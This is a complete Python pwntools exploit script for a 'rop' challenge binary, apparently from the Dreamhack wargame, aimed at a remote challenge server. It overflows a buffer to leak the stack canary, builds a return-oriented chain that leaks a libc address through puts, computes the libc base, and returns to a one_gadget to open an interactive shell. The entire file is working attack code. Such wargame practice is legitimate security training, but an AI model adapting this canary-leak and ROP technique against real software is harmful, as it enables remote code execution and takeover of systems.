#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                    b*main+199
                    c
                    c
                    ''')
    else:
        r = remote("host3.dreamhack.games", 16829)

    return r


def main():
    r = conn()
    input()

    pop_rdi = 0x00000000004007f3
    payload = b"a" * 57
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
    r.sendafter(b"Buf: ", payload)

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
    libc.address = leak_libc - 527008
    log.info("leak libc: " + hex(leak_libc))
    log.info("base libc: " + hex(libc.address))

    one_gadget = 0x4f432
    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    r.interactive()


if __name__ == "__main__":
    main()
